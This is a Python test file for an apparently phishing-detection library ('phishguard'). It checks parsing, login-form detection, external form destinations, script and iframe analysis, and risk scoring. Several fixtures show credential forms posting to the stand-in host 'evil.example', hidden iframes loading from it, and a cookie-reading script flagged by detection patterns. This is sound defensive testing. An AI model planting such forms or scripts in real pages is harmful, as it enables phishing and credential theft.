from unittest.mock import Mock, patch

from phishguard.core.content_intelligence import (
    fetch_page,
    parse_html,
    analyze_content,
    detect_credential_fields,
    detect_login_forms,
    analyze_credential_forms,
    analyze_form_destinations,
    analyze_javascript_iframes,
    calculate_content_risk,
)


# =========================================================
# V2.8 PHASE 1 TESTS
# =========================================================

def test_parse_basic_html():

    html = """
    <html>
        <head>
            <title>Test Page</title>
        </head>
        <body>
            <a href="/">Home</a>

            <form>
                <input type="text">
            </form>

            <script>
                console.log("test");
            </script>

            <iframe></iframe>
        </body>
    </html>
    """

    result = parse_html(html)

    assert result["title"] == "Test Page"
    assert result["form_count"] == 1
    assert result["input_count"] == 1
    assert result["script_count"] == 1
    assert result["iframe_count"] == 1
    assert result["link_count"] == 1


def test_parse_empty_html():

    result = parse_html("")

    assert result["title"] == ""
    assert result["form_count"] == 0
    assert result["input_count"] == 0
    assert result["script_count"] == 0
    assert result["iframe_count"] == 0
    assert result["link_count"] == 0


def test_fetch_page_success():

    response = Mock()

    response.status_code = 200

    response.headers = {
        "Content-Type": "text/html"
    }

    response.text = """
    <html>
        <head>
            <title>Test</title>
        </head>
        <body>
            Hello
        </body>
    </html>
    """

    with patch(
        "phishguard.core.content_intelligence.requests.get",
        return_value=response,
    ):

        result = fetch_page(
            "https://example.com"
        )

    assert result["success"] is True
    assert result["status_code"] == 200
    assert result["html"] != ""
    assert result["error"] is None


def test_fetch_page_failure():

    with patch(
        "phishguard.core.content_intelligence.requests.get",
        side_effect=Exception(
            "Connection failed"
        ),
    ):

        result = fetch_page(
            "https://example.com"
        )

    assert result["success"] is False
    assert result["error"] == "Connection failed"


def test_analyze_content():

    response = Mock()

    response.status_code = 200

    response.headers = {
        "Content-Type": "text/html; charset=utf-8"
    }

    response.text = """
    <html>
        <head>
            <title>Login Page</title>
        </head>

        <body>

            <form>

                <input type="text">

                <input type="password">

            </form>

            <script>
                console.log("test");
            </script>

        </body>
    </html>
    """

    with patch(
        "phishguard.core.content_intelligence.requests.get",
        return_value=response,
    ):

        result = analyze_content(
            "https://example.com"
        )

    assert result["success"] is True
    assert result["status_code"] == 200
    assert result["title"] == "Login Page"
    assert result["form_count"] == 1
    assert result["input_count"] == 2
    assert result["script_count"] == 1


# =========================================================
# V2.8 PHASE 2 TESTS
# CREDENTIAL / LOGIN FORM INTELLIGENCE
# =========================================================

def test_password_field_detection():

    html = """
    <form>

        <input
            type="text"
            name="username"
        >

        <input
            type="password"
            name="password"
        >

    </form>
    """

    result = detect_credential_fields(html)

    assert len(
        result["password_fields"]
    ) == 1

    assert len(
        result["username_fields"]
    ) == 1


def test_email_field_detection():

    html = """
    <form>

        <input
            type="email"
            name="email"
        >

    </form>
    """

    result = detect_credential_fields(html)

    assert len(
        result["email_fields"]
    ) == 1


def test_hidden_field_detection():

    html = """
    <form>

        <input
            type="hidden"
            name="token"
        >

    </form>
    """

    result = detect_credential_fields(html)

    assert len(
        result["hidden_fields"]
    ) == 1


def test_login_form_detection():

    html = """
    <form
        action="/login"
        method="post"
    >

        <input
            type="text"
            name="username"
        >

        <input
            type="password"
            name="password"
        >

        <button>
            Login
        </button>

    </form>
    """

    result = detect_login_forms(html)

    assert len(result) == 1

    assert result[0][
        "password_field_count"
    ] == 1

    assert result[0][
        "method"
    ] == "post"


def test_credential_form_analysis():

    html = """
    <form
        action="/login"
        method="post"
    >

        <input
            type="text"
            name="username"
        >

        <input
            type="password"
            name="password"
        >

        <input
            type="hidden"
            name="token"
        >

    </form>
    """

    result = analyze_credential_forms(html)

    assert result["risk_score"] >= 50

    assert result["risk_level"] == "HIGH"

    assert len(
        result["login_forms"]
    ) == 1

    assert len(
        result["password_fields"]
    ) == 1


# =========================================================
# V2.8 PHASE 3 TESTS
# EXTERNAL FORM DESTINATION INTELLIGENCE
# =========================================================

def test_same_domain_form():

    html = """
    <form
        action="/login"
        method="post"
    >

        <input
            type="text"
            name="username"
        >

        <input
            type="password"
            name="password"
        >

    </form>
    """

    result = analyze_form_destinations(
        html,
        "https://example.com/login"
    )

    assert result["external_form_count"] == 0

    assert result[
        "credential_external_count"
    ] == 0

    assert result["risk_score"] == 0

    assert result["risk_level"] == "SAFE"


def test_external_form_detection():

    html = """
    <form
        action="https://evil.example/collect"
        method="post"
    >

        <input
            type="text"
            name="name"
        >

    </form>
    """

    result = analyze_form_destinations(
        html,
        "https://example.com"
    )

    assert result[
        "external_form_count"
    ] == 1

    assert result[
        "credential_external_count"
    ] == 0

    assert result["risk_score"] == 15

    assert result["risk_level"] == "LOW"


def test_external_credential_form():

    html = """
    <form
        action="https://evil.example/login"
        method="post"
    >

        <input
            type="text"
            name="username"
        >

        <input
            type="password"
            name="password"
        >

    </form>
    """

    result = analyze_form_destinations(
        html,
        "https://example.com/login"
    )

    assert result[
        "external_form_count"
    ] == 1

    assert result[
        "credential_external_count"
    ] == 1

    assert result["risk_score"] == 50

    assert result["risk_level"] == "HIGH"


def test_relative_form_action():

    html = """
    <form
        action="/authenticate"
        method="post"
    >

        <input
            type="email"
            name="email"
        >

    </form>
    """

    result = analyze_form_destinations(
        html,
        "https://example.com/login"
    )

    assert result[
        "external_form_count"
    ] == 0

    assert result[
        "credential_external_count"
    ] == 0

    assert result["forms"][0][
        "absolute_action"
    ] == "https://example.com/authenticate"


def test_empty_form_action():

    html = """
    <form method="post">

        <input
            type="password"
            name="password"
        >

    </form>
    """

    result = analyze_form_destinations(
        html,
        "https://example.com/login"
    )

    assert result[
        "external_form_count"
    ] == 0

    assert result[
        "credential_external_count"
    ] == 0

    assert result["forms"][0][
        "absolute_action"
    ] == "https://example.com/login"


# =========================================================
# V2.8 PHASE 4 TESTS
# JAVASCRIPT & IFRAME INTELLIGENCE
# =========================================================

def test_inline_javascript_detection():

    html = """
    <html>
        <script>
            console.log("hello");
        </script>
    </html>
    """

    result = analyze_javascript_iframes(
        html,
        "https://example.com"
    )

    assert result["script_count"] == 1
    assert result["inline_script_count"] == 1
    assert result["external_script_count"] == 0
    assert result["suspicious_script_count"] == 0
    assert result["risk_score"] == 0
    assert result["risk_level"] == "SAFE"


def test_external_javascript_detection():

    html = """
    <html>
        <script src="https://cdn.example.com/app.js"></script>
    </html>
    """

    result = analyze_javascript_iframes(
        html,
        "https://example.com"
    )

    assert result["script_count"] == 1
    assert result["external_script_count"] == 1
    assert result["inline_script_count"] == 0
    assert result["scripts"][0]["is_external"] is True
    assert result["risk_score"] == 0


def test_suspicious_javascript_detection():

    html = """
    <html>
        <script>
            var data = atob("SGVsbG8=");
            document.cookie;
        </script>
    </html>
    """

    result = analyze_javascript_iframes(
        html,
        "https://example.com"
    )

    assert result["script_count"] == 1
    assert result["suspicious_script_count"] == 1
    assert result["risk_score"] == 25
    assert result["risk_level"] == "MEDIUM"

    assert (
        "atob("
        in result["scripts"][0]["suspicious_patterns"]
    )

    assert (
        "document.cookie"
        in result["scripts"][0]["suspicious_patterns"]
    )


def test_external_iframe_detection():

    html = """
    <html>
        <iframe
            src="https://evil.example/frame"
        ></iframe>
    </html>
    """

    result = analyze_javascript_iframes(
        html,
        "https://example.com"
    )

    assert result["iframe_count"] == 1
    assert result["external_iframe_count"] == 1
    assert result["hidden_iframe_count"] == 0
    assert result["risk_score"] == 15
    assert result["risk_level"] == "LOW"


def test_hidden_iframe_detection():

    html = """
    <html>
        <iframe
            src="/hidden"
            style="display: none;"
        ></iframe>
    </html>
    """

    result = analyze_javascript_iframes(
        html,
        "https://example.com"
    )

    assert result["iframe_count"] == 1
    assert result["hidden_iframe_count"] == 1
    assert result["external_iframe_count"] == 0
    assert result["risk_score"] == 20
    assert result["risk_level"] == "MEDIUM"


def test_external_hidden_iframe():

    html = """
    <html>
        <iframe
            src="https://evil.example/collect"
            width="0"
            height="0"
        ></iframe>
    </html>
    """

    result = analyze_javascript_iframes(
        html,
        "https://example.com"
    )

    assert result["iframe_count"] == 1
    assert result["external_iframe_count"] == 1
    assert result["hidden_iframe_count"] == 1

    assert result["risk_score"] == 35
    assert result["risk_level"] == "MEDIUM"


def test_safe_page_without_javascript_or_iframe():

    html = """
    <html>
        <head>
            <title>Safe Page</title>
        </head>

        <body>
            <h1>Hello World</h1>
            <p>This is a normal webpage.</p>
        </body>
    </html>
    """

    result = analyze_javascript_iframes(
        html,
        "https://example.com"
    )

    assert result["script_count"] == 0
    assert result["iframe_count"] == 0
    assert result["inline_script_count"] == 0
    assert result["external_script_count"] == 0
    assert result["suspicious_script_count"] == 0
    assert result["risk_score"] == 0
    assert result["risk_level"] == "SAFE"


# =========================================================
# V2.8 PHASE 5 TESTS
# CONTENT RISK SCORING
# =========================================================

def test_content_risk_safe():

    credential = {
        "risk_score": 0,
        "indicators": [],
    }

    forms = {
        "risk_score": 0,
        "indicators": [],
    }

    javascript = {
        "risk_score": 0,
        "indicators": [],
    }

    result = calculate_content_risk(
        credential,
        forms,
        javascript,
    )

    assert result["total_score"] == 0
    assert result["risk_level"] == "SAFE"
    assert result["indicators"] == []


def test_content_risk_low():

    credential = {
        "risk_score": 10,
        "indicators": [
            "Username/login field detected"
        ],
    }

    forms = {
        "risk_score": 0,
        "indicators": [],
    }

    javascript = {
        "risk_score": 0,
        "indicators": [],
    }

    result = calculate_content_risk(
        credential,
        forms,
        javascript,
    )

    assert result["credential_score"] == 10
    assert result["total_score"] == 10
    assert result["risk_level"] == "LOW"


def test_content_risk_medium():

    credential = {
        "risk_score": 30,
        "indicators": [
            "Credential fields detected"
        ],
    }

    forms = {
        "risk_score": 0,
        "indicators": [],
    }

    javascript = {
        "risk_score": 25,
        "indicators": [
            "Suspicious JavaScript patterns detected"
        ],
    }

    result = calculate_content_risk(
        credential,
        forms,
        javascript,
    )

    assert result["credential_score"] == 30
    assert result["javascript_score"] == 25
    assert result["total_score"] == 55
    assert result["risk_level"] == "MEDIUM"


def test_content_risk_high():

    credential = {
        "risk_score": 50,
        "indicators": [
            "Credential form detected"
        ],
    }

    forms = {
        "risk_score": 50,
        "indicators": [
            "Credential form submits data to an external domain"
        ],
    }

    javascript = {
        "risk_score": 25,
        "indicators": [
            "Suspicious JavaScript patterns detected"
        ],
    }

    result = calculate_content_risk(
        credential,
        forms,
        javascript,
    )

    assert result["total_score"] == 125
    assert result["risk_level"] == "HIGH"


def test_content_risk_combines_indicators():

    credential = {
        "risk_score": 20,
        "indicators": [
            "Credential fields detected",
            "Credential form detected",
        ],
    }

    forms = {
        "risk_score": 15,
        "indicators": [
            "Form submits data to an external domain",
        ],
    }

    javascript = {
        "risk_score": 20,
        "indicators": [
            "Hidden iframe detected",
        ],
    }

    result = calculate_content_risk(
        credential,
        forms,
        javascript,
    )

    assert result["total_score"] == 55

    assert result["risk_level"] == "MEDIUM"

    assert (
        "Credential fields detected"
        in result["indicators"]
    )

    assert (
        "Credential form detected"
        in result["indicators"]
    )

    assert (
        "Form submits data to an external domain"
        in result["indicators"]
    )

    assert (
        "Hidden iframe detected"
        in result["indicators"]
    )


def test_content_risk_removes_duplicate_indicators():

    credential = {
        "risk_score": 20,
        "indicators": [
            "Suspicious JavaScript patterns detected",
        ],
    }

    forms = {
        "risk_score": 15,
        "indicators": [
            "Suspicious JavaScript patterns detected",
        ],
    }

    javascript = {
        "risk_score": 25,
        "indicators": [
            "Suspicious JavaScript patterns detected",
        ],
    }

    result = calculate_content_risk(
        credential,
        forms,
        javascript,
    )

    assert result["total_score"] == 60

    assert result["risk_level"] == "MEDIUM"

    assert result["indicators"].count(
        "Suspicious JavaScript patterns detected"
    ) == 1
